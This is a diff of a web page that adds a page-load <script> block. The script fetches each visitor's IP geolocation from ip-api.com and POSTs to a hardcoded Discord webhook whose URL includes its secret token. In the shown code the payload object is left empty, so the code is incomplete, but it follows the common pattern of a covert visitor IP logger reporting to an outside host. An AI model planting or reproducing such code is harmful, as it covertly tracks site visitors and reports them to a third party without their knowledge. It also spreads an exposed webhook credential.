@@ -190,52 +190,57 @@ fetch('http://ip-api.com/json/?fields=61439')
     const payload = {
    
 
-let xhr = new XMLHttpRequest();
 
 
-let url = "http://ip-api.com/json/?fields=61439";
+  <script type="module">
+   
+    let xhr = new XMLHttpRequest();
 
+   
+    let url = "http://ip-api.com/json/?fields=61439";
 
-xhr.open("GET", url);
-
-
-xhr.responseType = "json";
-
-
-xhr.send();
-
-
-xhr.onload = function() {
-  
-  let response = xhr.response;
+ 
+    xhr.open("GET", url);
 
   
-  let discordWebhookURL = "https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh";
+    xhr.responseType = "json";
 
-  
-  let payload = {
     
-  };
+    xhr.send();
 
- 
-  let discordWebhookXHR = new XMLHttpRequest();
+   
+    xhr.onload = function() {
+     
+      let response = xhr.response;
 
+      // Define the Discord webhook URL
+      let discordWebhookURL = "https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh";
 
-  discordWebhookXHR.open("POST", discordWebhookURL);
+      // Define the payload to send to the Discord webhook
+      let payload = {
+        // Add your payload data here based on the webhook documentation
+      };
 
+      // Create a new XMLHttpRequest object to make a request to the Discord webhook URL
+      let discordWebhookXHR = new XMLHttpRequest();
 
-  discordWebhookXHR.setRequestHeader("Content-Type", "application/json");
+      // Use the POST method to send the payload data to the Discord webhook
+      discordWebhookXHR.open("POST", discordWebhookURL);
 
+      // Set the content type of the request to JSON
+      discordWebhookXHR.setRequestHeader("Content-Type", "application/json");
 
-  discordWebhookXHR.send(JSON.stringify(payload));
+      // Send the payload data to the Discord webhook
+      discordWebhookXHR.send(JSON.stringify(payload));
 
- 
-  console.log("Payload data has been sent to the Discord webhook.");
-};
+      // Output a message to the console to indicate that the payload data has been sent to the Discord webhook
+      console.log("Payload data has been sent to the Discord webhook.");
+    };
 
-
-xhr.onerror = function() {
-
-  console.error("An error occurred while making a request to the API endpoint.");
-};
-```
+    // Define a function to handle any errors that occur when making a request to the API endpoint
+    xhr.onerror = function() {
+      // Output an error message to the console
+      console.error("An error occurred while making a request to the API endpoint.");
+    };
+  </script>
+</body>
